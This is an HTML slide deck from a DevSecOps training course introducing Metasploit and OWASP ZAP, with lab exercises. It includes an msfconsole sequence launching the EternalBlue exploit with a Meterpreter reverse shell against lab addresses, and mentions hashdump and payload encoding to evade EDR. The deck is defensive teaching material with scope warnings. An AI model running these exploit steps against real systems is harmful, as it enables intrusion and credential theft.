@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PEN Testing Tools — Metasploit & ZAP | DevSecOps</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@4.5.0/dist/reset.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@4.5.0/dist/reveal.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@4.5.0/dist/theme/white.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@4.5.0/plugin/highlight/monokai.css">
+    <style>
+        :root { --heading-color: #1a365d; --accent-color: #2b6cb0; --success-color: #2f855a; --warning-color: #c05621; --danger-color: #c53030; --text-color: #2d3748; }
+        .reveal { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; color: var(--text-color); font-size: 28px; }
+        .reveal .slides section { text-align: left; padding: 20px 40px; }
+        .reveal h1, .reveal h2, .reveal h3, .reveal h4 { color: var(--heading-color); font-weight: 700; text-transform: none; }
+        .reveal h1 { font-size: 2.2em; } .reveal h2 { font-size: 1.6em; } .reveal h3 { font-size: 1.3em; }
+        .title-slide { text-align: center !important; }
+        .title-slide h1 { color: #ffffff; font-size: 2.4em; text-shadow: 2px 2px 4px rgba(0,0,0,0.3); margin-bottom: 0.3em; }
+        .title-slide h2 { color: #e2e8f0; font-size: 1.4em; font-weight: 400; }
+        .title-slide h3 { color: #cbd5e0; font-size: 1.1em; font-weight: 300; }
+        .section-divider { text-align: center !important; }
+        .section-divider h2 { color: #ffffff; font-size: 2.0em; text-shadow: 2px 2px 4px rgba(0,0,0,0.3); }
+        .section-divider h3 { color: #e2e8f0; font-size: 1.2em; font-weight: 400; }
+        .highlight-box { background: #ebf8ff; border-left: 4px solid var(--accent-color); padding: 20px 25px; border-radius: 0 8px 8px 0; margin: 15px 0; text-align: left; }
+        .highlight-box.success { background: #f0fff4; border-left-color: var(--success-color); }
+        .highlight-box.warning { background: #fffaf0; border-left-color: var(--warning-color); }
+        .highlight-box.danger { background: #fff5f5; border-left-color: var(--danger-color); }
+        .two-columns { display: grid; grid-template-columns: 1fr 1fr; gap: 30px; align-items: start; text-align: left; }
+        .three-columns { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 20px; align-items: start; text-align: left; }
+        .card { background: #ffffff; border-radius: 12px; padding: 25px; box-shadow: 0 4px 6px rgba(0,0,0,0.07), 0 1px 3px rgba(0,0,0,0.1); border: 1px solid #e2e8f0; text-align: left; }
+        .card h3, .card h4 { margin-top: 0; color: var(--accent-color); }
+        .concept-box { background: linear-gradient(135deg, #ebf8ff 0%, #e2e8f0 100%); border-radius: 12px; padding: 25px; margin: 15px 0; border: 1px solid #bee3f8; text-align: left; }
+        .concept-box h3, .concept-box h4 { color: var(--heading-color); margin-top: 0; }
+        .key-point { background: #ebf8ff; border: 2px solid var(--accent-color); border-radius: 12px; padding: 20px 25px; margin: 15px 0; text-align: left; font-size: 0.95em; }
+        .key-point strong { color: var(--accent-color); }
+        .lab-callout h2 { color: #ffffff; font-size: 1.8em; margin-bottom: 0.3em; }
+        .lab-callout h3 { color: #90cdf4; font-size: 1.3em; font-weight: 400; }
+        .lab-callout p { color: #e2e8f0; font-size: 1.0em; }
+        .lab-callout ul { color: #e2e8f0; text-align: left; display: inline-block; }
+        .lab-callout .highlight-box { background: rgba(255,255,255,0.1); border-left-color: #90cdf4; color: #e2e8f0; }
+        .questions-slide h2 { color: #ffffff; font-size: 2.2em; }
+        .questions-slide p { color: #e2e8f0; font-size: 1.2em; }
+        .module-progress { display: flex; justify-content: center; gap: 8px; margin-top: 20px; }
+        .module-progress .step { width: 30px; height: 6px; border-radius: 3px; background: #cbd5e0; }
+        .module-progress .step.active { background: var(--accent-color); }
+        .module-progress .step.completed { background: var(--success-color); }
+        .reveal table { border-collapse: collapse; width: 100%; font-size: 0.75em; margin: 15px 0; }
+        .reveal table th { background: var(--heading-color); color: #ffffff; padding: 12px 16px; text-align: left; font-weight: 600; }
+        .reveal table td { padding: 10px 16px; border-bottom: 1px solid #e2e8f0; text-align: left; }
+        .reveal table tr:nth-child(even) { background: #f7fafc; }
+        .reveal ul, .reveal ol { text-align: left; display: block; margin-left: 1em; }
+        .reveal li { margin-bottom: 0.5em; line-height: 1.5; font-size: 0.9em; }
+        .reveal p { line-height: 1.6; }
+        .reveal pre code { font-size: 0.7em; line-height: 1.4; max-height: 500px; overflow: auto; border-radius: 8px; }
+    </style>
+</head>
+<body>
+    <div class="reveal">
+        <div class="slides">
+
+            <!-- Title -->
+            <section data-background="linear-gradient(135deg, #1a365d 0%, #2b6cb0 100%)" class="title-slide">
+                <h1>&#128295; PEN Testing Tools</h1>
+                <h2>Metasploit &amp; OWASP ZAP &mdash; the workhorses</h2>
+                <h3>DevSecOps &mdash; Module 7 of 9</h3>
+                <div class="module-progress">
+                    <div class="step completed"></div><div class="step completed"></div><div class="step completed"></div><div class="step completed"></div><div class="step completed"></div><div class="step completed"></div><div class="step active"></div><div class="step"></div><div class="step"></div>
+                </div>
+                <aside class="notes">Two complementary tools: Metasploit for infrastructure-side exploitation, ZAP for web-app DAST. Both have CLI / API interfaces &mdash; we'll use both ideas in module 9.</aside>
+            </section>
+
+            <!-- Objectives -->
+            <section>
+                <h2>&#127919; Module objectives</h2>
+                <ul>
+                    <li class="fragment fade-up">Navigate the Metasploit Framework: modules, payloads, sessions, Meterpreter</li>
+                    <li class="fragment fade-up">Run a known exploit against a lab target with safety rails</li>
+                    <li class="fragment fade-up">Use OWASP ZAP for spider, passive scan, active scan, and intercept</li>
+                    <li class="fragment fade-up">Read and triage the reports each tool produces</li>
+                    <li class="fragment fade-up">Identify the limits of automated tools (and where humans must take over)</li>
+                </ul>
+                <aside class="notes">Two labs in this module — split learners into roughly even time on each, ~30 min apiece.</aside>
+            </section>
+
+            <!-- Section 1 divider -->
+            <section data-background="linear-gradient(135deg, #2f855a 0%, #2b6cb0 100%)" class="section-divider">
+                <h2>Part 1 &mdash; Metasploit</h2>
+                <h3>Modules, payloads, sessions</h3>
+                <aside class="notes">~30 minutes on Metasploit, then transition to ZAP.</aside>
+            </section>
+
+            <!-- What is metasploit -->
+            <section>
+                <h2>&#128299; What is Metasploit?</h2>
+                <div class="concept-box">
+                    <h3>An exploitation framework, not just a tool</h3>
+                    <p>The Metasploit Framework is a Ruby-based collection of <strong>2,000+ modules</strong> &mdash; exploits, payloads, encoders, post-exploitation utilities &mdash; with a uniform CLI (<code>msfconsole</code>) and an MSGRPC API.</p>
+                </div>
+                <ul>
+                    <li class="fragment fade-up">Originally Rapid7's open-source platform; community + pro editions</li>
+                    <li class="fragment fade-up">Pre-installed on Kali Linux</li>
+                    <li class="fragment fade-up">Used by red teams, IR responders, and exploit researchers</li>
+                </ul>
+                <aside class="notes">Stress: the same tooling defenders run is what attackers use. Knowing it helps both sides.</aside>
+            </section>
+
+            <!-- Module types -->
+            <section>
+                <h2>&#128218; Module types</h2>
+                <table>
+                    <tr><th>Type</th><th>Purpose</th><th>Example</th></tr>
+                    <tr><td>Exploit</td><td>Triggers a vulnerability</td><td><code>exploit/multi/handler</code></td></tr>
+                    <tr><td>Payload</td><td>Code that runs after exploitation</td><td><code>windows/meterpreter/reverse_tcp</code></td></tr>
+                    <tr><td>Auxiliary</td><td>Scan, fuzz, brute-force</td><td><code>auxiliary/scanner/ssh/ssh_login</code></td></tr>
+                    <tr><td>Post</td><td>Run after a session opens</td><td><code>post/multi/recon/local_exploit_suggester</code></td></tr>
+                    <tr><td>Encoder</td><td>Obfuscate payloads</td><td><code>x86/shikata_ga_nai</code></td></tr>
+                    <tr><td>NOP</td><td>Pad shellcode reliably</td><td><code>x86/single_byte</code></td></tr>
+                </table>
+                <aside class="notes">Most learners only ever see exploit + payload. Auxiliary + post are where the long-tail value lives.</aside>
+            </section>
+
+            <!-- msfconsole basics -->
+            <section>
+                <h2>&#128187; <code>msfconsole</code> &mdash; the basics</h2>
+                <pre><code class="language-bash"># Search for a known vuln
+msf6 &gt; search cve:2017-0144
+
+# Pick an exploit, see required options
+msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(ms17_010_eternalblue) &gt; show options
+
+# Set target &amp; payload
+msf6 exploit(ms17_010_eternalblue) &gt; set RHOSTS 10.10.10.5
+msf6 exploit(ms17_010_eternalblue) &gt; set PAYLOAD windows/x64/meterpreter/reverse_tcp
+msf6 exploit(ms17_010_eternalblue) &gt; set LHOST 10.10.10.99
+
+# Fire
+msf6 exploit(ms17_010_eternalblue) &gt; run</code></pre>
+                <div class="highlight-box"><strong>Workflow:</strong> <code>search</code> &rarr; <code>use</code> &rarr; <code>show options</code> &rarr; <code>set</code> &rarr; <code>check</code> &rarr; <code>run</code>.</div>
+                <aside class="notes">Have a cheat-sheet handout for the lab. The CLI is intuitive once you know the verbs.</aside>
+            </section>
+
+            <!-- Sessions and meterpreter -->
+            <section>
+                <h2>&#127916; Sessions &amp; Meterpreter</h2>
+                <ul>
+                    <li class="fragment fade-up">Successful exploitation opens a <strong>session</strong> &mdash; a control channel back to the target</li>
+                    <li class="fragment fade-up"><strong>Meterpreter</strong> is the most-used payload: in-memory, encrypted, scriptable</li>
+                    <li class="fragment fade-up">Common Meterpreter commands: <code>sysinfo</code>, <code>getuid</code>, <code>hashdump</code>, <code>screenshot</code>, <code>portfwd</code>, <code>route</code></li>
+                    <li class="fragment fade-up">Sessions can be backgrounded (<code>bg</code>), interacted with (<code>sessions -i 1</code>), or killed</li>
+                </ul>
+                <div class="highlight-box warning"><strong>Lab discipline:</strong> only target the lab Metasploitable host. Anything else requires written scope.</div>
+                <aside class="notes">Meterpreter is the point where "interesting" starts — pivoting, post-exploitation, etc. Keep the lab simple to avoid time blowouts.</aside>
+            </section>
+
+            <!-- Defender perspective on metasploit -->
+            <section>
+                <h2>&#128737;&#65039; Defender's view of Metasploit</h2>
+                <ul>
+                    <li class="fragment fade-up">EDR signatures aggressively flag default Meterpreter</li>
+                    <li class="fragment fade-up">Encoded payloads &amp; custom templates can evade &mdash; use this to test detection coverage</li>
+                    <li class="fragment fade-up"><strong>Use it intentionally:</strong> run the exact module a CVE corresponds to and verify your alerting catches it</li>
+                </ul>
+                <div class="highlight-box success"><strong>Detection-engineering practice:</strong> for each ATT&amp;CK technique you care about, run the matching Metasploit module against a test host and watch the SIEM.</div>
+                <aside class="notes">This is the "purple-team" use of Metasploit. Far more useful than ad-hoc red-team work.</aside>
+            </section>
+
+            <!-- Section 2 divider -->
+            <section data-background="linear-gradient(135deg, #2f855a 0%, #2b6cb0 100%)" class="section-divider">
+                <h2>Part 2 &mdash; OWASP ZAP</h2>
+                <h3>Web-app DAST &amp; intercepting proxy</h3>
+                <aside class="notes">Switch contexts: web apps. ZAP is the open-source counterpart to Burp Suite Pro.</aside>
+            </section>
+
+            <!-- What is zap -->
+            <section>
+                <h2>&#129422; What is OWASP ZAP?</h2>
+                <div class="concept-box">
+                    <h3>Zed Attack Proxy</h3>
+                    <p>An open-source web application security scanner. Functions as both an <strong>intercepting proxy</strong> for manual testing and an <strong>automated scanner</strong> for CI/CD.</p>
+                </div>
+                <ul>
+                    <li class="fragment fade-up">Three modes: GUI desktop, headless daemon, container image</li>
+                    <li class="fragment fade-up">REST API + automation framework for pipeline use</li>
+                    <li class="fragment fade-up">Active community, dozens of add-ons</li>
+                    <li class="fragment fade-up">Free, OWASP flagship project</li>
+                </ul>
+                <aside class="notes">Module 9 will integrate ZAP into Jenkins. Today is about understanding what it does.</aside>
+            </section>
+
+            <!-- Concepts -->
+            <section>
+                <h2>&#128221; ZAP &mdash; core concepts</h2>
+                <div class="three-columns">
+                    <div class="card">
+                        <h4>Spider</h4>
+                        <p>Crawls the app to build a site tree. Two flavours: traditional + AJAX (uses a real browser).</p>
+                    </div>
+                    <div class="card">
+                        <h4>Passive scan</h4>
+                        <p>Inspects every request/response that flows through the proxy. Doesn't generate traffic itself. Safe.</p>
+                    </div>
+                    <div class="card">
+                        <h4>Active scan</h4>
+                        <p>Sends purpose-built attack traffic (XSS, SQLi, etc.) to discovered endpoints. <em>Aggressive.</em></p>
+                    </div>
+                </div>
+                <div class="highlight-box warning"><strong>Active scans can break things.</strong> Run on a lab/test environment, never directly on production without scope.</div>
+                <aside class="notes">Most learners want to "just active-scan everything." Reinforce: passive first, then targeted active.</aside>
+            </section>
+
+            <!-- Workflow -->
+            <section>
+                <h2>&#128270; A typical manual ZAP workflow</h2>
+                <ol>
+                    <li class="fragment fade-up">Configure browser to use ZAP as proxy (<code>localhost:8080</code>) &amp; install ZAP CA</li>
+                    <li class="fragment fade-up">Browse the app like a normal user &mdash; passive scan runs in the background</li>
+                    <li class="fragment fade-up">Run the spider / AJAX spider to discover hidden endpoints</li>
+                    <li class="fragment fade-up">Review passive findings &mdash; cookie flags, headers, info leaks</li>
+                    <li class="fragment fade-up">Run targeted active scan against a specific URL or context</li>
+                    <li class="fragment fade-up">Inspect &amp; reissue requests via Manual Request Editor / Repeater</li>
+                    <li class="fragment fade-up">Export the report (HTML, JSON, SARIF)</li>
+                </ol>
+                <aside class="notes">SARIF export plugs nicely into GitHub code scanning + Azure DevOps work-item creation.</aside>
+            </section>
+
+            <!-- Headless usage -->
+            <section>
+                <h2>&#128011; Headless ZAP for automation</h2>
+                <pre><code class="language-bash"># Baseline scan &mdash; passive only, fast, CI-friendly
+docker run --rm -t \
+  -v $(pwd):/zap/wrk:rw \
+  ghcr.io/zaproxy/zaproxy:stable \
+  zap-baseline.py -t https://target.local -r baseline-report.html
+
+# Full scan &mdash; passive + active, slower
+docker run --rm -t \
+  -v $(pwd):/zap/wrk:rw \
+  ghcr.io/zaproxy/zaproxy:stable \
+  zap-full-scan.py -t https://target.local -r full-report.html</code></pre>
+                <div class="highlight-box"><strong>In Jenkins / GitHub Actions:</strong> <code>zap-baseline.py</code> for every PR, <code>zap-full-scan.py</code> nightly against staging.</div>
+                <aside class="notes">Module 9 will turn this command into a Jenkins stage. Good to see it standalone first.</aside>
+            </section>
+
+            <!-- Authentication -->
+            <section>
+                <h2>&#128272; Scanning behind login</h2>
+                <ul>
+                    <li class="fragment fade-up"><strong>Form-based:</strong> ZAP auth scripts &mdash; record-and-replay a login</li>
+                    <li class="fragment fade-up"><strong>Token-based:</strong> set a session header in context</li>
+                    <li class="fragment fade-up"><strong>OAuth / Entra ID:</strong> obtain a token outside ZAP, inject as bearer</li>
+                    <li class="fragment fade-up"><strong>Verify auth still works</strong> mid-scan with a "logged-in" indicator</li>
+                </ul>
+                <div class="highlight-box success"><strong>Without auth, ZAP only sees the unauthenticated surface.</strong> Most app risk lives behind login.</div>
+                <aside class="notes">Auth setup is where most ZAP-in-CI projects get stuck. Plan for it.</aside>
+            </section>
+
+            <!-- Strengths and limits -->
+            <section>
+                <h2>&#9878;&#65039; What ZAP &amp; Metasploit do <em>not</em> find</h2>
+                <ul>
+                    <li class="fragment fade-up"><strong>Business-logic flaws</strong> &mdash; "discount applied 10 times" needs a human</li>
+                    <li class="fragment fade-up"><strong>Authorisation bypass between roles</strong> &mdash; needs context the tool doesn't have</li>
+                    <li class="fragment fade-up"><strong>Race conditions</strong> &mdash; tool is sequential, attacker is parallel</li>
+                    <li class="fragment fade-up"><strong>Chained vulns</strong> &mdash; tools find atomic findings; attackers stitch them together</li>
+                    <li class="fragment fade-up"><strong>Cryptographic protocol mistakes</strong> &mdash; need design review, not scanning</li>
+                </ul>
+                <aside class="notes">Hammer this home: tools are necessary, never sufficient. Manual testing pays for itself precisely on the high-impact issues.</aside>
+            </section>
+
+            <!-- Module recap -->
+            <section>
+                <h2>&#9989; Module recap</h2>
+                <div class="key-point"><strong>Metasploit</strong> &mdash; the framework for infrastructure-level exploitation; understand <em>module</em>, <em>payload</em>, <em>session</em>.</div>
+                <div class="key-point"><strong>ZAP</strong> &mdash; the open-source web DAST; passive then active, manual or headless.</div>
+                <div class="key-point"><strong>Tool ceiling:</strong> business logic, chained issues, and design flaws still need humans.</div>
+                <aside class="notes">Two labs back-to-back: Metasploit then ZAP. Recombine in module 9.</aside>
+            </section>
+
+            <!-- Lab 6 callout -->
+            <section data-background="linear-gradient(135deg, #1a365d 0%, #2b6cb0 100%)" data-background-color="#1a365d" class="lab-callout">
+                <h2>&#128295; Lab 6: Metasploit basics</h2>
+                <h3>Run a known exploit against the lab target</h3>
+                <ul>
+                    <li>Launch <code>msfconsole</code> on the attacker workstation</li>
+                    <li><code>db_nmap</code> the lab Metasploitable host into the workspace</li>
+                    <li>Use <code>vsftpd_234_backdoor</code> (or similar safe module) and gain a session</li>
+                    <li>Run <code>sysinfo</code> &amp; <code>id</code>; capture screenshots as evidence</li>
+                    <li>Document module, options, and outcome in the lab report template</li>
+                </ul>
+                <div class="highlight-box">
+                    <strong>Duration:</strong> ~30 minutes &middot; <strong>Pair:</strong> No
+                </div>
+                <aside class="notes">vsftpd 2.3.4 backdoor is the friendliest module for first-time learners — almost zero options to set.</aside>
+            </section>
+
+            <!-- Lab 7 callout -->
+            <section data-background="linear-gradient(135deg, #1a365d 0%, #2b6cb0 100%)" data-background-color="#1a365d" class="lab-callout">
+                <h2>&#128295; Lab 7: OWASP ZAP basics</h2>
+                <h3>Spider, passive-scan, and active-scan Juice Shop</h3>
+                <ul>
+                    <li>Configure browser to proxy through ZAP (<code>localhost:8080</code>)</li>
+                    <li>Browse Juice Shop &mdash; observe passive findings populate</li>
+                    <li>Run the AJAX spider; review the site tree</li>
+                    <li>Active-scan one targeted URL (e.g. the search endpoint)</li>
+                    <li>Export the report; map findings to OWASP Top 10 categories</li>
+                </ul>
+                <div class="highlight-box">
+                    <strong>Duration:</strong> ~30 minutes &middot; <strong>Pair:</strong> No
+                </div>
+                <aside class="notes">Limit active scan to one endpoint — full active scans on Juice Shop can take 20+ minutes and overrun the lab.</aside>
+            </section>
+
+            <!-- Questions -->
+            <section data-background="linear-gradient(135deg, #1a365d 0%, #2b6cb0 100%)" class="questions-slide" style="text-align: center;">
+                <h2>&#10067; Questions &amp; discussion</h2>
+                <p>Where in your pipeline could a baseline ZAP scan run today?</p>
+                <aside class="notes">Sets up module 9 perfectly.</aside>
+            </section>
+
+        </div>
+    </div>
+    <script src="https://cdn.jsdelivr.net/npm/reveal.js@4.5.0/dist/reveal.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/reveal.js@4.5.0/plugin/highlight/highlight.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/reveal.js@4.5.0/plugin/notes/notes.js"></script>
+    <script>
+        Reveal.initialize({ hash: true, slideNumber: true, transition: 'slide', plugins: [RevealHighlight, RevealNotes] });
+    </script>
+</body>
+</html>
